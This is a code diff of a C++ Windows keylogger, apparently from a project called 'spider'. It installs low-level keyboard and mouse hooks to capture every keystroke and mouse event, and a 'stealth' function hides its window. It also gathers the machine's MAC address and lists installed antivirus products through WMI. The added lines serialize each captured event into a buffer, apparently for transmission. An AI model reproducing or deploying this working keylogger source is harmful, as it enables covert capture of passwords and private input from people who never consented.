@@ -8,16 +8,17 @@
 // Last update Fri Sep 29 16:21:22 2017 Jeremy Thoveron
 //
 
-#include	"WindowsKeyLogger.hpp"
+#include	"KeyLogger/WindowsKeyLogger.hpp"
 #include	<iphlpapi.h>
 #include	<iomanip>
 #include 	<comdef.h>
 #include 	<Wbemidl.h>
 #include	<atlbase.h>
 #include	<chrono>
-#include	<ctime>
 #include	<memory>
 #include	<sstream>
+#include 	"Protocol/Buffer.hpp"
+#include        "Protocol/Serializer.hpp"
 
 #pragma comment(lib, "wbemuuid.lib")
 #pragma comment(lib, "IPHLPAPI.lib")
@@ -96,7 +97,7 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
       {
 	try
 	{
-	  str = WindowsKeyLogger::correlingTable.at(static_cast<int>(str[0]));
+	  str = spider::WindowsKeyLogger::correlingTable.at(static_cast<int>(str[0]));
 	}
 	catch (std::out_of_range const &)
 	{
@@ -106,7 +107,6 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
       else
 	str = tolower(str[0]);
       infos.get()->data = str;
-      std::cout << str << std::endl;
     }
       /// actually the length of the str is superior at 1, it means that we have
       /// retrieved a vk code and that we should check either our correlingTable
@@ -115,7 +115,7 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
     {
       try
       {
-	str = WindowsKeyLogger::keys.at(content->vkCode);
+	str = spider::WindowsKeyLogger::keys.at(content->vkCode);
 	infos.get()->data = str;
       }
       catch (std::out_of_range const &)
@@ -124,6 +124,7 @@ LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
       }
     }
   }
+  spider::Buffer::BufferInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*infos)));
   return CallNextHookEx(hookKeyboard, code, wp, lp);
 }
 
@@ -172,7 +173,6 @@ LRESULT CALLBACK 		handleMouse(int code, WPARAM wp, LPARAM lp)
       break;
     case (WM_MOUSEWHEEL):
     {
-      std::cout << "Mouse Wheel" << std::endl;
       ///supplementary check to know in which direction is the mouse scrolled
       if (HIWORD(mouseStruct->mouseData) == 120)
       {
@@ -192,150 +192,158 @@ LRESULT CALLBACK 		handleMouse(int code, WPARAM wp, LPARAM lp)
 	break;
     }
   }
+  spider::Buffer::BufferInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*infos)));
   return CallNextHookEx(hookMouse, code, wp, lp);
 }
 
-WindowsKeyLogger::WindowsKeyLogger()
+namespace spider
 {
-  this->infos = new t_register();
-}
-
-WindowsKeyLogger::~WindowsKeyLogger()
-{
-  delete this->infos;
-}
-
-void WindowsKeyLogger::stealth()
-{
-  HWND stealth;
-
-  AllocConsole();
-  stealth = FindWindow("KeyLoggerWindow", nullptr);
-  ShowWindow(stealth, 0);
-}
-
-void WindowsKeyLogger::initHooks()
-{
-  if (hookKeyboard)
-    UnhookWindowsHookEx(hookKeyboard);
-  hookKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, static_cast<HOOKPROC>(handleKeyboard), nullptr, 0);
-  if (hookMouse)
-    UnhookWindowsHookEx(hookMouse);
-  hookMouse = SetWindowsHookEx(WH_MOUSE_LL, static_cast<HOOKPROC>(handleMouse), nullptr, 0);
-}
-
-void WindowsKeyLogger::unHooks()
-{
-  if (hookKeyboard)
-    UnhookWindowsHookEx(hookKeyboard);
-  if (hookMouse)
-    UnhookWindowsHookEx(hookMouse);
-}
-
-void WindowsKeyLogger::getMacAddr()
-{
-  IP_ADAPTER_INFO	AdapterInfo[16];
-  PIP_ADAPTER_INFO 	pAdapterInfo;
-  DWORD  		buffer;
-  DWORD			status;
-  std::stringstream	test;
-
-  buffer = sizeof(AdapterInfo);
-  status = GetAdaptersInfo(AdapterInfo, &buffer);
-  if (status == ERROR_SUCCESS)
+  WindowsKeyLogger::WindowsKeyLogger()
   {
-    pAdapterInfo = AdapterInfo;
-   test << std::hex << std::uppercase << std::setfill('0') <<
-	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[0]) << ":" <<
-	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[1]) << ":" <<
-	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[2]) << ":" <<
-	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[3]) << ":" <<
-	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[4]) << ":" <<
-	      std::setw(2) << static_cast<int>(pAdapterInfo->Address[5]);
-    this->infos->mac = test.str();
-  }
-  else
-  {
-    std::cout << "Impossible to resolve the mac address" << std::endl;
-  }
-}
-
-void	WindowsKeyLogger::getOperatingSystem()
-{
-#ifdef _WIN32
-  this->infos->os = "Windows";
-#endif
-}
-
-void WindowsKeyLogger::getAntiVirus()
-{
-  HRESULT hres;
-  IWbemLocator *locator = nullptr;
-  IWbemServices *services = nullptr;
-  IEnumWbemClassObject *pEnumerator = nullptr;
-  IWbemClassObject *object = nullptr;
-  ULONG uReturn = 0;
-  std::string	antivirusList;
-
-  hres = CoInitializeEx(nullptr, 0);
-  if (FAILED(hres))
-  {
-    std::cerr << "Failed to initialize COM library" << std::endl;
-    return ;
+    this->infos = new t_register();
   }
 
-  hres = CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE, nullptr);
-  if (FAILED(hres))
+  WindowsKeyLogger::~WindowsKeyLogger()
   {
-    std::cerr << "Failed to initialize security" << std::endl;
-    return ;
+    delete this->infos;
   }
 
-  hres = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER, IID_IWbemLocator, reinterpret_cast<LPVOID *>(&locator));
-  if (FAILED(hres))
+  void WindowsKeyLogger::stealth()
   {
-    std::cerr << "Fail to to create IWbemLocator object" << std::endl;
-    return ;
+    HWND stealth;
+
+    AllocConsole();
+    stealth = FindWindow("KeyLoggerWindow", nullptr);
+    ShowWindow(stealth, 0);
   }
 
-  hres = locator->ConnectServer(_bstr_t(L"root\\SecurityCenter2"), nullptr, nullptr, nullptr, 0, nullptr, nullptr, &services);
-  if (FAILED(hres))
+  void WindowsKeyLogger::initHooks()
   {
-    std::cerr << "Fail to connect" << std::endl;
-    return ;
+    if (hookKeyboard)
+      UnhookWindowsHookEx(hookKeyboard);
+    hookKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, static_cast<HOOKPROC>(handleKeyboard), nullptr, 0);
+    if (hookMouse)
+      UnhookWindowsHookEx(hookMouse);
+    hookMouse = SetWindowsHookEx(WH_MOUSE_LL, static_cast<HOOKPROC>(handleMouse), nullptr, 0);
   }
 
-  hres = CoSetProxyBlanket(services, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);
-  if (FAILED(hres))
+  void WindowsKeyLogger::unHooks()
   {
-    std::cerr << "Could not set proxy blanket" << std::endl;
-    return ;
+    if (hookKeyboard)
+      UnhookWindowsHookEx(hookKeyboard);
+    if (hookMouse)
+      UnhookWindowsHookEx(hookMouse);
   }
 
-  wchar_t *query = bstr_t("Select * From AntiVirusProduct");
-  hres = services->ExecQuery(bstr_t("WQL"), bstr_t("Select * From AntiVirusProduct"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator);
-  if (FAILED(hres))
+  void WindowsKeyLogger::getMacAddr()
   {
-    std::cerr << "Query for antivirus name failed" << std::endl;
-    return ;
-  }
+    IP_ADAPTER_INFO	AdapterInfo[16];
+    PIP_ADAPTER_INFO 	pAdapterInfo;
+    DWORD  		buffer;
+    DWORD			status;
+    std::stringstream	test;
 
-  while (pEnumerator)
-  {
-    pEnumerator->Next(WBEM_INFINITE, 1, &object, &uReturn);
-    if (0 == uReturn)
+    buffer = sizeof(AdapterInfo);
+    status = GetAdaptersInfo(AdapterInfo, &buffer);
+    if (status == ERROR_SUCCESS)
     {
-      break;
+      pAdapterInfo = AdapterInfo;
+     test << std::hex << std::uppercase << std::setfill('0') <<
+                std::setw(2) << static_cast<int>(pAdapterInfo->Address[0]) << ":" <<
+                std::setw(2) << static_cast<int>(pAdapterInfo->Address[1]) << ":" <<
+                std::setw(2) << static_cast<int>(pAdapterInfo->Address[2]) << ":" <<
+                std::setw(2) << static_cast<int>(pAdapterInfo->Address[3]) << ":" <<
+                std::setw(2) << static_cast<int>(pAdapterInfo->Address[4]) << ":" <<
+                std::setw(2) << static_cast<int>(pAdapterInfo->Address[5]);
+      this->infos->mac = test.str();
     }
-    CComVariant cvtVersion;
-    std::string	antivirus;
-    object->Get(L"displayName", 0, &cvtVersion, 0, 0);
-    antivirus = CW2A(cvtVersion.bstrVal);
-    antivirusList.append(antivirus);
+    else
+    {
+      std::cout << "Impossible to resolve the mac address" << std::endl;
+    }
   }
-  this->infos->antivirus = antivirusList;
-  services->Release();
-  locator->Release();
-  pEnumerator->Release();
-  CoUninitialize();
+
+  void	WindowsKeyLogger::getOperatingSystem()
+  {
+  #ifdef _WIN32
+    this->infos->os = "Windows";
+  #endif
+  }
+
+  void WindowsKeyLogger::getAntiVirus()
+  {
+    HRESULT hres;
+    IWbemLocator *locator = nullptr;
+    IWbemServices *services = nullptr;
+    IEnumWbemClassObject *pEnumerator = nullptr;
+    IWbemClassObject *object = nullptr;
+    ULONG uReturn = 0;
+    std::string	antivirusList;
+
+    hres = CoInitializeEx(nullptr, 0);
+    if (FAILED(hres))
+    {
+      std::cerr << "Failed to initialize COM library" << std::endl;
+      return ;
+    }
+
+    hres = CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE, nullptr);
+    if (FAILED(hres))
+    {
+      std::cerr << "Failed to initialize security" << std::endl;
+      return ;
+    }
+
+    hres = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER, IID_IWbemLocator, reinterpret_cast<LPVOID *>(&locator));
+    if (FAILED(hres))
+    {
+      std::cerr << "Fail to to create IWbemLocator object" << std::endl;
+      return ;
+    }
+
+    hres = locator->ConnectServer(_bstr_t(L"root\\SecurityCenter2"), nullptr, nullptr, nullptr, 0, nullptr, nullptr, &services);
+    if (FAILED(hres))
+    {
+      std::cerr << "Fail to connect" << std::endl;
+      return ;
+    }
+
+    hres = CoSetProxyBlanket(services, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);
+    if (FAILED(hres))
+    {
+      std::cerr << "Could not set proxy blanket" << std::endl;
+      return ;
+    }
+
+    wchar_t *query = bstr_t("Select * From AntiVirusProduct");
+    hres = services->ExecQuery(bstr_t("WQL"), bstr_t("Select * From AntiVirusProduct"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator);
+    if (FAILED(hres))
+    {
+      std::cerr << "Query for antivirus name failed" << std::endl;
+      return ;
+    }
+
+    while (pEnumerator)
+    {
+      pEnumerator->Next(WBEM_INFINITE, 1, &object, &uReturn);
+      if (0 == uReturn)
+      {
+        break;
+      }
+      CComVariant cvtVersion;
+      std::string	antivirus;
+      object->Get(L"displayName", 0, &cvtVersion, 0, 0);
+      antivirus = CW2A(cvtVersion.bstrVal);
+      antivirusList.append(antivirus);
+    }
+    this->infos->antivirus = antivirusList;
+    services->Release();
+    locator->Release();
+    pEnumerator->Release();
+    CoUninitialize();
+  }
+
+  t_register const *WindowsKeyLogger::getInfos()
+  { return this->infos; }
 }
+
